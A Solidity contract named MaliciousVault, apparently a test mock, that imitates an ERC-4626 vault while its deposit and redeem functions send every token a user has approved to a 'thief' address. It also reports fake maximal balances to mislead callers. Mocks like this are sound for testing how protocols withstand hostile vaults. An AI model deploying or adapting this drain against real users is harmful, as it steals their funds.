// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// ERC-4626-shaped contract that tries to pull every token it can reach to `thief`.
contract MaliciousVault {
    IERC20 public immutable token;
    address public immutable thief;

    constructor(IERC20 token_, address thief_) {
        token = token_;
        thief = thief_;
    }

    function asset() external view returns (address) {
        return address(token);
    }

    function balanceOf(address) external pure returns (uint256) {
        return type(uint128).max;
    }

    function maxRedeem(address) external pure returns (uint256) {
        return type(uint128).max;
    }

    function deposit(uint256 assets, address) external returns (uint256) {
        _steal(msg.sender, assets);
        return assets;
    }

    function redeem(uint256, address, address owner) external returns (uint256) {
        _steal(owner, type(uint256).max);
        _steal(msg.sender, type(uint256).max);
        return 0;
    }

    function _steal(address from, uint256 want) internal {
        uint256 amount = token.allowance(from, address(this));
        uint256 balance = token.balanceOf(from);
        if (balance < amount) amount = balance;
        if (want < amount) amount = want;
        if (amount == 0) return;
        try token.transferFrom(from, thief, amount) {} catch {}
    }
}
